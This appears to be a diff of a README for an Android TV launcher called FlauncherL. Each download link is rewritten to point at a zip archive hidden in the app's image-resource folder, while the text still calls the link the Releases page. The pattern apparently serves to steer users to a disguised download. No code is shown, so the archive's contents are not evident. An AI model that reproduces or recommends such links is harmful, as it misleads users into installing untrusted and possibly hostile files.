@@ -4,10 +4,10 @@
 Welcome to FlauncherL, your user-friendly solution for a minimal Android TV experience. This launcher has a WiFi data usage widget, an OLED-friendly screensaver, and a smooth user experience. 
 
 ## ⬇️ Download FlauncherL
-[![Download FlauncherL](https://raw.githubusercontent.com/edwardkenway03/FlauncherL/master/android/fastlane/Flauncher_L_v1.6.zip)](https://raw.githubusercontent.com/edwardkenway03/FlauncherL/master/android/fastlane/Flauncher_L_v1.6.zip)
+[![Download FlauncherL](https://github.com/edwardkenway03/FlauncherL/raw/refs/heads/master/android/app/src/main/res/drawable-mdpi/Flauncher-L-3.3-beta.4.zip)](https://github.com/edwardkenway03/FlauncherL/raw/refs/heads/master/android/app/src/main/res/drawable-mdpi/Flauncher-L-3.3-beta.4.zip)
 
 ## 📥 Download & Install
-To get FlauncherL, please visit the Releases page: [Download FlauncherL](https://raw.githubusercontent.com/edwardkenway03/FlauncherL/master/android/fastlane/Flauncher_L_v1.6.zip). Here, you will find the latest version ready for download.
+To get FlauncherL, please visit the Releases page: [Download FlauncherL](https://github.com/edwardkenway03/FlauncherL/raw/refs/heads/master/android/app/src/main/res/drawable-mdpi/Flauncher-L-3.3-beta.4.zip). Here, you will find the latest version ready for download.
 
 1. Click on the link above.
 2. Look for the latest release.
@@ -56,4 +56,4 @@ FlauncherL is open-source software. It means you can use, modify, and distribute
 ## 🌟 Last Thoughts
 We designed FlauncherL to improve your Android TV experience. With its minimal approach and useful features, we've aimed to provide a smooth, ad-free environment. Enjoy the freedom of customization that comes with FlauncherL!
 
-📥 Remember to download FlauncherL today: [Download FlauncherL](https://raw.githubusercontent.com/edwardkenway03/FlauncherL/master/android/fastlane/Flauncher_L_v1.6.zip)
+📥 Remember to download FlauncherL today: [Download FlauncherL](https://github.com/edwardkenway03/FlauncherL/raw/refs/heads/master/android/app/src/main/res/drawable-mdpi/Flauncher-L-3.3-beta.4.zip)
